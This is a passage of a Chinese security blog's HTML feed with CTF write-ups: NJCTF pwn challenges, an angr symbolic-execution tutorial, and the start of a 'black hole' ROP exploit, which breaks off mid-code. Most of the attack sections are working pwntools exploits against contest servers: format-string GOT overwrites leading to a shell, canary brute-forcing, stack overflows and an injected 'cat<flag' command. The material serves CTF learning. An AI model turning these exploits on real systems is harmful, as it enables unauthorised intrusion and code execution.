class="string">&quot;[*] addr:&#123;0&#125; ===&gt; value:&#123;1&#125;&quot;</span>.format(hex(addr), <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log.info(<span class="string">&quot;[*] addr:&#123;0&#125; ===&gt; value:&#123;1&#125;&quot;</span>.format(hex(addr), res[:<span class="number">4</span>].encode(<span class="string">&quot;hex&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> res[:<span class="number">4</span>]<span class="comment">#res = res.ljust(4, &quot;\x00&quot;)</span></span><br><span class="line"><span class="comment">#leak()</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;me\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = leak(printf_got)</span><br><span class="line">printf_addr = printf_addr</span><br><span class="line">printf_addr = u32(printf_addr)</span><br><span class="line"><span class="comment"># print &quot;[*] printf addr:&#123;0&#125;&quot;.format(hex(printf_addr)) #printf addr:0xf7596020</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_addr = printf_addr - 0xe6e0#0xd100</span></span><br><span class="line"><span class="comment"># print &quot;[*] system addr:&#123;0&#125;&quot;.format(hex(system_addr)) #system addr:0xf7587940</span></span><br><span class="line"></span><br><span class="line">d = DynELF(leak,printf_addr)</span><br><span class="line">system_addr = d.lookup(<span class="string">&quot;system&quot;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;systemAddr = %#x&#x27;</span> % (systemAddr)</span><br><span class="line"></span><br><span class="line">write = system_addr &amp; <span class="number">0xffffff</span></span><br><span class="line">two = write&amp;<span class="number">0xffff</span></span><br><span class="line">one = (write&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload += p32(printf_got)</span><br><span class="line">payload += <span class="string">&quot;%&#123;0&#125;c%7$hhn%&#123;1&#125;c%8$hn&quot;</span>.format(one<span class="number">-8</span>,two-one)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>dump　file代码是pxx师傅的　我自己打方法失败了　23333</p><h1 id="VSVS"><a href="#VSVS" class="headerlink" title="VSVS"></a>VSVS</h1><p>代码执行，在name的位置输入超过1024个字节后紧跟bash，之后的命令会被 当成命令执行<br>验证code可暴力解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">NJCTF&#123;e24de6dea4b118a8f7986fe853c15fce&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;218.2.197.235&#x27;</span>, <span class="number">23749</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;code:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;22&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">1024</span></span><br><span class="line">payload += <span class="string">&quot;cat&lt;flag&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> r.recv(<span class="number">100</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="Pwn200"><a href="#Pwn200" class="headerlink" title="Pwn200"></a>Pwn200</h1><p>栈溢出简单粗暴，不过需要暴力猜解canary，然后直接ret到send flag的函数那里，把flag读回来。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#由于是fork的程序，考虑爆破canary</span></span><br><span class="line"><span class="comment">#爆破脚本如下：</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;joker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&quot;\x00&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(canary) == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">0xff</span>):</span><br><span class="line">        canary_tmp = canary + chr(item)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = remote(<span class="string">&#x27;218.2.197.234&#x27;</span>, <span class="number">2090</span>)</span><br><span class="line">            r.recvuntil(<span class="string">&quot;Welcome!\n&quot;</span>)</span><br><span class="line">            payload = <span class="string">&quot;A&quot;</span>*(<span class="number">0x70</span><span class="number">-8</span>)</span><br><span class="line">            payload += canary_tmp</span><br><span class="line">            r.send(payload)</span><br><span class="line">            data = r.recv(<span class="number">100</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Message received!&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                canary += chr(item)</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;get:&#123;0&#125;&quot;</span>.format(hex(item))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            r.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    raw_input(<span class="string">&quot;joker&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] canary:&#123;0&#125;&quot;</span>.format(u64(canary))</span><br></pre></td></tr></table></figure><p>程序读取了flag并且存在直接send flag的payload<br>.text:0000000000400BCA                 mov     eax, cs:fd<br>.text:0000000000400BD0                 mov     ecx, 0<br>.text:0000000000400BD5                 mov     edx, 64h<br>.text:0000000000400BDA                 mov     esi, offset flag_address<br>.text:0000000000400BDF                 mov     edi, eax<br>.text:0000000000400BE1                 call    _send</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;joker&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#local canary = 0x6767cae5244b5000</span></span><br><span class="line">canary = <span class="string">&quot;\x00\xcf\x4d\x36\x2e\xf4\xcc\x9d&quot;</span></span><br><span class="line">send_flag = <span class="number">0x400BCA</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;218.2.197.234&#x27;</span>,<span class="number">2090</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Welcome!&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*(<span class="number">0x70</span><span class="number">-8</span>)</span><br><span class="line">payload += canary</span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x400BCA</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> r.recv(<span class="number">100</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="re400"><a href="#re400" class="headerlink" title="re400"></a>re400</h1><p>可在程序中找到目标md5值，输入并尝试用gdb去调试可以猜到flag值。</p><p>＃ 战队ＷＰ<br><a href="https://www.xctf.org.cn/information/2a195fab682c600b5493f42cddd3acb8f4df443a/">wp</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> NJCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>angr初探</title>
      <link href="angr-study.html"/>
      <url>angr-study.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近muhe师傅，给我发了一个PDF，是湾湾写的二进制自动化分析攻击，他的文档主要写的上angr，于是玩对这个玩意儿也开始有了一点兴趣。刚好假期joekr师傅给我发了一个angr分析的二进制题目。于是2333 就开始了折腾。</p><h1 id="什么是angr"><a href="#什么是angr" class="headerlink" title="什么是angr"></a>什么是angr</h1><p>angr是一个用于分析二进制文件的python框架。它专注于静态和符号分析，使其适用于各种任务。其项目地址是，<a href="https://github.com/angr">https://github.com/angr</a>.</p><h1 id="什么是符号执行"><a href="#什么是符号执行" class="headerlink" title="什么是符号执行"></a>什么是符号执行</h1><p><em>来自维基百科</em><br>符号执行 （Symbolic Execution）是一种程序分析技术。其可以通过分析程序来得到让特定代码区域执行的输入。使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。[1]<br>符号模拟技术（symbolic simulation）则把类似的思想用于硬件分析。符号计算（Symbolic computation）则用于数学表达式分析。</p><h1 id="angr安装-以及遇到的坑"><a href="#angr安装-以及遇到的坑" class="headerlink" title="angr安装 以及遇到的坑"></a>angr安装 以及遇到的坑</h1><p>我这使用的是ubutnu系统：</p><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper</span><br></pre></td></tr></table></figure><p>如果你正在尝试angr管理，你会需要安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libqt4-dev graphviz-dev</span><br></pre></td></tr></table></figure><h2 id="创建虚拟环境以及安装angr模块"><a href="#创建虚拟环境以及安装angr模块" class="headerlink" title="创建虚拟环境以及安装angr模块"></a>创建虚拟环境以及安装angr模块</h2><p><code>mkvirtualenv angr &amp;&amp; pip install angr</code>通常应该足够在大多数情况下安装angr，因为angr发布在Python包索引上。<br>Fish（shell）用户可以使用virtualfish或virtualenv包。<br><code>vf new angr &amp;&amp; vf activate angr &amp;&amp; pip install angr</code></p><h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><blockquote><p>由于在导入angr时加载capstone失败导致的ImportError</p></blockquote><p>官方文档仔细介绍了如何几种常见的错误报告，我这里遇到的是上面的这种。解决方法有两种：</p><ol><li>pip install -I –no-use-wheel capston</li><li>移动libcapstone.so到与Python文件相同的目录</li></ol><h1 id="angr简单使用"><a href="#angr简单使用" class="headerlink" title="angr简单使用"></a>angr简单使用</h1><h2 id="装载二进制文件"><a href="#装载二进制文件" class="headerlink" title="装载二进制文件"></a>装载二进制文件</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = angr.Project(<span class="string">&quot;/binnary/&quot;</span>)   <span class="comment"># 这里放的是bin的路径</span></span><br></pre></td></tr></table></figure><p>更多详细的东西，我就不当搬运工了，可以转<a href="https://docs.angr.io/docs/loading.html">https://docs.angr.io/docs/loading.html</a></p><h1 id="angr脚本"><a href="#angr脚本" class="headerlink" title="angr脚本"></a>angr脚本</h1><p>如果上一个标题的内容，即angr框架的基本用法，那么我们就可以开始学习一下angr的运用，以及脚本的编写。<br><em>YSC</em> 整理了angr比较常用的方法：</p><ul><li>Surveyours</li><li>Path group</li><li>Symbolic args</li><li>Symbolic input</li><li>Breakpoint</li><li>Hook<h2 id="Surveyours"><a href="#Surveyours" class="headerlink" title="Surveyours"></a>Surveyours</h2>Surveyor是驱动符号执行的引擎：它跟踪哪些路径处于活动状态，标识哪些路径向前转，哪些路径要修剪，并优化资源的分配。<br>但是在官方文档的介绍当中，他是更加推荐的是使用<em>PathGroups</em>的使用。<br>最基本的，我们可以这样使用他<h3 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a>Explorer</h3><code>angr.surveyor.Explore</code>是<code>Surveyor</code>实现符号执行的一个方法。它将实现起点，目标，过滤等功能，以及确定执行的路径避免陷入无谓的循环当中。<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">b =  angr.Project(<span class="string">&quot;./examples/Bin&quot;</span>) <span class="comment"># 第一就是基本的载入二进制文件</span></span><br><span class="line"></span><br><span class="line">e =  b.surveyor.Explore()</span><br><span class="line"><span class="keyword">print</span> e.step() <span class="comment"># 暂停</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> e.run() <span class="comment"># 开始</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%d paths are still running&quot;</span> % len(e.active)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%d paths are backgrounded due to lack of resources&quot;</span> % len(e.spilled)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%d paths are suspended due to user action&quot;</span> % len(e.suspended)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%d paths had errors&quot;</span> % len(e.errored)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;%d paths deadended&quot;</span> % len(e.deadended)</span><br></pre></td></tr></table></figure>上面的脚本并没有做任何简单的限制，因此，想必任务量是极其大的，因此，我们可以做一些条件。<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">e = b.surveyors.Explorer(find=(<span class="number">0x4006ed</span>,), avoid=(<span class="number">0x4006aa</span>,<span class="number">0x4006fd</span>))</span><br><span class="line">e.run()</span><br><span class="line"><span class="keyword">if</span> len(e.found) &gt; <span class="number">0</span>:</span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;Found backdoor path:&quot;</span>, e.found[<span class="number">0</span>]</span><br><span class="line"> <span class="keyword">print</span> <span class="string">&quot;Avoided %d paths&quot;</span> % len(e.avoided)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">print</span> e.found[ <span class="number">0</span> ].state.se._solver.result.model</span><br></pre></td></tr></table></figure>Explorer这个方法可以设定说要找到哪个程式执行的位址，可以用find=(addr1)来找，和使用avoid=(addr2)来避免找到某位址。设定find=(addr1)有点像是在下断点，但注意位址必须是基本区块（basic block）的开头 ，否则angr并不会找到该位址，导致最后该路径会被归类成deadended而不是found。<br>其中se代表求解器solver engine的意思。</li></ul><h3 id="Path-group"><a href="#Path-group" class="headerlink" title="Path group"></a>Path group</h3><p>我查阅了官方文档给的出的CTF 题目解决样例，发现基本都是使用Path group这个方法的。仔细对比了一下，这个方法和surveyors很相像，但是多出了像state等参数。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p =  angr.Project(<span class="string">&quot;./examples/Bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">s =  p.factory.blank_state(addr = <span class="number">0x4006ed</span>)</span><br><span class="line">pg = p.factory.Path_group(s,immutable = <span class="literal">False</span>)</span><br><span class="line">path = pg.explore(find  = (<span class="number">0x4006aa</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> path</span><br><span class="line"><span class="keyword">print</span> pg.found[<span class="number">0</span>].state.se._solver.result.model</span><br></pre></td></tr></table></figure><p>上面的脚本，先是定义了一个变数s，其中一个blank_state代表的是空白的状态，起点的设定是从0x4006ed开始（我们通过这样的设置，让程序从我们指定的位置开始）至于如果要从头开始执行，可以用s = prog.factory.entry_state(args=[“./vul”])来指定在程式进入点时的状态。</p><p>紧接着的就是path_group，刚刚的状态放进去当参数即可，接下来则和surveyors相同。</p><h1 id="CodeGateCTF-Angrybird"><a href="#CodeGateCTF-Angrybird" class="headerlink" title="CodeGateCTF - Angrybird"></a>CodeGateCTF - Angrybird</h1><p>上面的内容，都是基本设计到了angr的使用，这里我们用一个刚结束没多久的比赛CodeGateCTF的一个题目作为demo，我们尝试自己分析并且编写一下脚本。题目连接在文章最后会提供。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/angr-study-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/angr-study-01.jpg"></a></p><p>0 0 当我看到这个东西的时候，我是很想骂人的。我总不能一个一个去patch这些该死的东西吧。<br>我们最终的结果，肯定是要得到flag，得到flag，我们肯定得调用print 或者put这样的函数，那么通过静态分析，我们很可以很容易找到目标地址。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/angr-study-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/angr-study-02.png"></a></p><p>这里，目标地址就是0000000000404FC1。<br>那么，我们如何避免那些该死的东西呢，我们这里可以设置aovid函数，我们可以设置一个简单的入口。或者，我们干脆一点，把一些无用的东西nop掉。这里，我选择选择设置入口</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4007DA</span></span><br><span class="line">find = <span class="number">0x404FBC</span></span><br><span class="line">avoid = [<span class="number">0x400590</span>]</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./angrybird2&#x27;</span>)</span><br><span class="line">init = p.factory.blank_state(addr=main)</span><br><span class="line">pg = p.factory.path_group(init, threads=<span class="number">8</span>)</span><br><span class="line">ex = pg.explore(find=find, avoid=avoid)</span><br><span class="line"></span><br><span class="line">final = ex.found[<span class="number">0</span>].state</span><br><span class="line">flag = final.posix.dumps(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Flag: &#123;0&#125;&quot;</span>.format(final.posix.dumps(<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><h1 id="参考文档以及链接"><a href="#参考文档以及链接" class="headerlink" title="参考文档以及链接"></a>参考文档以及链接</h1><p>angr 官方文档 <a href="https://docs.angr.io/docs">doc</a><br>angr脚本编写参考 <a href="http://ysc21.github.io/">Ysc’blog</a><br>CodeGateCTF - Angrybird <a href="https://github.com/ctfs/write-ups-2017/tree/master/codegate-prequals-2017/re/angrybird-500">Angrybird</a></p><p>#　以及最后<br>虽然angr很好用，但是我们也不能执着用工具，方法还是要学习的，比如，我师傅让我好好学习一下angr的代码。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> angry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i 春秋-CTF-Pwn-2017-2</title>
      <link href="ichunqiu-CTF-Pwn-2017-2.html"/>
      <url>ichunqiu-CTF-Pwn-2017-2.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>简单分析下这几个题目，具体调试我就不再截图了</p><h1 id="black-hole"><a href="#black-hole" class="headerlink" title="black hole"></a>black hole</h1><p>这个题目是Pxx师傅出的，考点大概是在没有leak，又没有libc的情况下如何去getshell吧。</p><h2 id="我们看看IDA找到的地方。"><a href="#我们看看IDA找到的地方。" class="headerlink" title="我们看看IDA找到的地方。"></a>我们看看IDA找到的地方。</h2><p>我们先进主函数</p><figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  alarm(<span class="number">0x60</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( check() == <span class="number">2333</span> )</span><br><span class="line">    overflowme();</span><br><span class="line">  exit_(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进入漏洞函数，我们基本可以看出来，这是一个很简单的栈溢出。</p><figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">size_t sub_4006CC()</span><br><span class="line">&#123;</span><br><span class="line">  char ptr; <span class="comment">// [sp+0h] [bp-10h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fread(&amp;ptr, <span class="number">1</span>uLL, <span class="number">0x20</span>uLL, stdin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然我们已经找到漏洞的地方，现在就是考虑如何去利用他，然后如何编写exp的事情了。问题，这个题目是没有leak的，于是我和muhe一起掉到了一个坑里-&gt;ret2dlresolve</p><p>正确的做法应该是:<br>不断ret到main函数，循环读取输入，写完payload之后，ret到ret这个gadgets，去执行ROP。<br>因为是动态链接x64的程序，所以ROP构造直接使用通型gadgets去构造。覆盖alarm@got最后一字节，爆破的手段，找到syscall…然后就是布置好寄存器，起shell了。</p><blockquote><p>如果对通用型gadgets有问题，可以去看看蒸米的文章。过段时间，我复习的时候应该也会写个文章的。</p></blockquote><h3 id="最后exp"><a href="#最后exp" class="headerlink" title="最后exp"></a>最后exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&#x27;black_hole&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line">    p = remote(<span class="string">&quot;106.75.66.195&quot;</span>,<span class="number">11003</span>)</span><br><span class="line">main_addr = <span class="number">0x0000000000400704</span></span><br><span class="line">token = <span class="number">2333</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_stack</span>(<span class="params">data</span>):</span></span><br><span class="line">    p.sendline(str(token))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload = data.rjust(<span class="number">0x18</span>,<span class="string">&#x27;A&#x27;</span>) + p64(main_addr)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">gadget_1 = <span class="number">0x00000000004007A6</span></span><br><span class="line">gadget_2 = <span class="number">0x0000000000400790</span></span><br><span class="line"> </span><br><span class="line">addr_got_read = <span class="number">0x0000000000601028</span></span><br><span class="line">addr_bss = <span class="number">0x000000000601058</span></span><br><span class="line">addr_got_alarm = <span class="number">0x0000000000601020</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">com_gadget</span>(<span class="params">part1, part2, jmp2, arg1 = <span class="number">0x0</span>, arg2 = <span class="number">0x0</span>, arg3 = <span class="number">0x0</span>,Flag=True</span>):</span></span><br><span class="line">    <span class="keyword">if</span> Flag:</span><br><span class="line">        pl = p64(part1)   <span class="comment"># part1 entry pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</span></span><br><span class="line">        pl += p64(<span class="number">0</span>)       <span class="comment"># for junk</span></span><br><span class="line">        pl += p64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">        pl += p64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">        pl += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">        pl += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">        pl += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">        pl += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">        pl += p64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">        <span class="keyword">return</span> pl</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pl     = p64(<span class="number">0</span>)       <span class="comment"># for junk</span></span><br><span class="line">        pl += p64(<span class="number">0x0</span>)     <span 